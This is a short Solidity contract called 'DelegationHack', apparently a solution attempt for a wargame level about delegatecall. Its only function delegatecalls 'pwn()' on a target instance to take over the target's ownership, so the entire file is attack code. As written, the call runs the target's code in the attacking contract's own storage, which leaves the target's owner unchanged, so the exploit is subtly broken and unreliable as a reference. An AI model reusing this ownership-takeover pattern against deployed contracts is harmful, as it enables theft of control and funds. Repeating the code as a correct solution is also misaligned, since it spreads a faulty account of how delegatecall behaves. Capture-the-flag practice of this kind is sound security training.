// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;



contract DelegationHack {


  event Response(bool success, bytes data);

    function hack(address _instanceAddr) public {
     (bool success, bytes memory data) = _instanceAddr.delegatecall(abi.encodeWithSignature("pwn()"));
    require(success);

            emit Response(success, data);
        }
}